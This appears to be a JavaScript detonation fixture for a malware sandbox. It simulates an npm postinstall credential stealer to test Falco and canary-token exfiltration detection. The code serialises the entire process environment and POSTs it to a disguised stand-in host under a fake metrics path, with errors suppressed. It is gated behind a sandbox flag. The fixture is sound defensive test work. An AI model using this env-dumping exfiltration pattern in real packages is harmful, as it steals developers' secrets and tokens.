// AIRLOCK DETONATION FIXTURE -- SIMULATED, inert outside the sandbox.
//
// Reproduces a technique family seen in many npm credential stealers: a
// postinstall hook serialises the whole environment and POSTs it out. The
// sandbox seeds the environment with a decoy canary token, so the sink sees
// that token leave and records an exfiltration.
//
// Detection path exercised: airlock_outbound_connection (Falco) and
// canary_exfiltrated (sink, the canary is an env value).

// Safety interlock: do nothing unless the Airlock sandbox set this flag.
if (process.env.AIRLOCK_SANDBOX !== "1") process.exit(0);

const http = require("http");

const body = JSON.stringify(process.env);
const request = http.request({
  host: "telemetry.airlock-sim.invalid", // RFC 2606 .invalid: never resolves to a real host
  method: "POST",
  path: "/v1/metrics",
  headers: { "Content-Length": Buffer.byteLength(body) },
});
request.on("error", () => {}); // stay silent if the sink is not listening
request.end(body);
